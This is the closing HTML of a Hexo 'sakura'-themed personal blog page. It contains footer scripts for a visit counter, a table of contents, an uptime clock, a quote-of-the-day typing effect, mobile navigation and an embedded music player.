    </div><!-- .site-info -->
</footer>


<!--<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.7/js/tocbot.min.js"></script>-->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/InsightSearch.js"></script>
<script type="text/javascript"
        src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/zoom.min.js"></script>

        <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@1.4/js/sakura-app.js"></script>

<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/av-min.js"></script>
<script src='https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/Valine.min.js'></script>
<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->

      
       <script>
  fetch('https://counts.42cloud.cn/api/counts.html')
        .then(response => response.json())
        .then(data => {
              if (document.getElementById("readcount")) {
                document.getElementById("readcount").innerHTML=data.Count;
            }
            if (document.getElementById("allcount")){
                document.getElementById("allcount").innerHTML=data.Allcount;
            }
        })
        .catch(err => console.error(err))
</script>
      
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
    /* <![CDATA[ */
    if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
        var Poi = {
            "pjax": "1",
            "movies": {"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2", "name": "Unbroken.mp4", "live": "close"},
            "windowheight": "fixed",
            "codelamp": "close",
            "ajaxurl": "",
            "order": "asc",
            "formpostion": "bottom"
        };
    } else {
        var Poi = {
            "pjax": "1",
            "movies": {"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2", "name": "Unbroken.mp4", "live": "open"},
            "windowheight": "auto",
            "codelamp": "close",
            "ajaxurl": "",
            "order": "asc",
            "formpostion": "bottom"
        };
    }
    /* ]]> */

</script>
<script>
    $(document).ready(function () {
        if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
            if ($(".pattern-center").length > 0) { //有图的情况
                tocbot.init({
                    // Where to render the table of contents.
                    tocSelector: '.toc', // 放置目录的容器
                    // Where to grab the headings to build the table of contents.
                    contentSelector: '.entry-content', // 正文内容所在
                    // Which headings to grab inside of the contentSelector element.
                    scrollSmooth: true,
                    headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
                    headingsOffset: -400,
                    scrollSmoothOffset: -85
                });
            } else {
                tocbot.init({
                    // Where to render the table of contents.
                    tocSelector: '.toc', // 放置目录的容器
                    // Where to grab the headings to build the table of contents.
                    contentSelector: '.entry-content', // 正文内容所在
                    // Which headings to grab inside of the contentSelector element.
                    scrollSmooth: true,
                    headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
                    headingsOffset: -85,
                    scrollSmoothOffset: -85
                });
            }
            var offsetTop = $('.toc').offset().top - 95;
            window.onscroll = function () {
                var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
                if (scrollTop >= offsetTop) {
                    $('.toc').addClass('toc-fixed');
                } else {
                    $('.toc').removeClass('toc-fixed');
                }
            }
        }
    });
</script>

    <script type="text/javascript">
        function NewDate(str) {
            str = str.split('-');
            var date = new Date();
            date.setUTCFullYear(str[0], str[1] - 1, str[2]);
            date.setUTCHours(0, 0, 0, 0);
            return date;
        }

        function momxc() {
            var birthDay = NewDate("2019-6-16");
            var today = new Date();
            var timeold = today.getTime() - birthDay.getTime();
            var sectimeold = timeold / 1000
            var secondsold = Math.floor(sectimeold);
            var msPerDay = 24 * 60 * 60 * 1000;
            var e_daysold = timeold / msPerDay;
            var daysold = Math.floor(e_daysold);
            var e_hrsold = (daysold - e_daysold) * -24;
            var hrsold = Math.floor(e_hrsold);
            var e_minsold = (hrsold - e_hrsold) * -60;
            var minsold = Math.floor((hrsold - e_hrsold) * -60);
            var seconds = Math.floor((minsold - e_minsold) * -60).toString();
            document.getElementById("momk").innerHTML = "本站已安全运行" + daysold + "天" + hrsold + "小时" + minsold + "分" + seconds + "秒";
            setTimeout(momxc, 1000);
        }

        momxc();
    </script>



    <script type="text/javascript">
        fetch('https://v1.hitokoto.cn')
            .then(response => response.json())
            .then(data => {
                chakhsu(document.getElementById("chakhsu"), data.hitokoto);
            })
            .catch(err => console.error(err));


        // 文字循环处理 两个参数，第一个是需要显示在哪个标签内append 以id为选择器，第二个参数是 要处理的文字
        function chakhsu(r, text) {
            function t() {
                return b[Math.floor(Math.random() * b.length)];
            }

            function e() {
                return String.fromCharCode(94 * Math.random() + 33);
            }

            function n(r) {
                for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
                    var l = document.createElement("span");
                    (l.textContent = e()), (l.style.color = t()), n.appendChild(l);
                }
                return n;
            }

            function i() {
                var t = o[c.skillI];
                c.step
                    ? c.step--
                    : ((c.step = g),
                        c.prefixP < l.length
                            ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++)
                            : "forward" === c.direction
                            ? c.skillP < t.length
                                ? ((c.text += t[c.skillP]), c.skillP++)
                                : c.delay
                                    ? c.delay--
                                    : ((c.direction = "backward"), (c.delay = a))
                            : c.skillP > 0
                                ? ((c.text = c.text.slice(0, -1)), c.skillP--)
                                : ((c.skillI = (c.skillI + 1) % o.length),
                                    (c.direction = "forward"))),
                    (r.textContent = c.text),
                    r.appendChild(
                        n(
                            c.prefixP < l.length
                                ? Math.min(s, s + c.prefixP)
                                : Math.min(s, t.length - c.skillP)
                        )
                    ),
                    setTimeout(i, d);
            }

            /*以下内容自定义修改*/
            var l = "",
                o = [text].map(function (r) {
                    return r + "";
                }),
                a = 3,
                g = 1,
                s = 5,
                d = 75,
                b = [
                    "rgb(110,64,170)",
                    "rgb(150,61,179)",
                    "rgb(191,60,175)",
                    "rgb(228,65,157)",
                    "rgb(254,75,131)",
                    "rgb(255,94,99)",
                    "rgb(255,120,71)",
                    "rgb(251,150,51)",
                    "rgb(226,183,47)",
                    "rgb(198,214,60)",
                    "rgb(175,240,91)",
                    "rgb(127,246,88)",
                    "rgb(82,246,103)",
                    "rgb(48,239,130)",
                    "rgb(29,223,163)",
                    "rgb(26,199,194)",
                    "rgb(35,171,216)",
                    "rgb(54,140,225)",
                    "rgb(76,110,219)",
                    "rgb(96,84,200)"
                ],
                c = {
                    text: "",
                    prefixP: -s,
                    skillI: 0,
                    skillP: 0,
                    direction: "forward",
                    delay: a,
                    step: g
                };
            i();
        }
    </script>




<script src="https://cdn.jsdelivr.net/gh/yremp/live2d@1.0/autoload.js"></script>
    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">T1h2er3</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="http://github.com/t1h2er3" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="https://wpa.qq.com/msgrd?v=3&uin=1078340014&site=qq&menu=yes" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="javascript:;">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
            文章分类
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/%E6%8A%80%E6%9C%AF/">
                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            兴趣
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/music/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  音乐
                </a>
              </li>
            
          </ul>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    switch="true"

    id="2660651585"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
  
  <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
</body>
</html>